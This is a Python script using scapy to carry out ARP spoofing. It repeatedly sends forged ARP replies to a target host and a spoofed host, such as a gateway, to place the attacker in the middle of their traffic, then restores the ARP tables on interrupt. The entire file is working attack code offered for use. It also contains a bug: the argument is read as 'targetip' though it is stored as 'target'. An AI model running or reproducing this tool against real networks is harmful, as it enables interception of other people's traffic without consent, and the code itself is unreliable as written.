#!/usr/bin/env python3 
from itertools import count
from scapy import packet
from scapy.utils import import_object
from network_scanner import print_result
import scapy.all as scapy
import time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--targetip", dest= "target", help= "Enter target IP ")
    parser.add_argument("-s", "--spoofip", dest = "spoofip", help = " Enter Spoofed IP")
    options = parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    
    return answered_list[0][1].hwsrc
    
    

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2 , pdst = target_ip, hwdst=target_mac, psrc = spoof_ip )
    scapy.send(packet, verbose = False)
    
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP( op=2 , pdst = destination_ip , hwdst= destination_mac, psrc = source_ip , hwsrc = source_mac )
    scapy.send(packet, count=4, verbose=False)


try:
    options = get_arguments()
    sent_packets_count = 0
    while True:
        spoof(options.target, options.spoofip)
        spoof(options.spoofip, options.targetip)
        sent_packets_count += 2 
        print("\r[+] Packets sent:" + str(sent_packets_count), end= "")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Resetting ARP Tables....")
    restore(options.target, options.spoofip)
    restore(options.spoofip, options.targetip)
    
    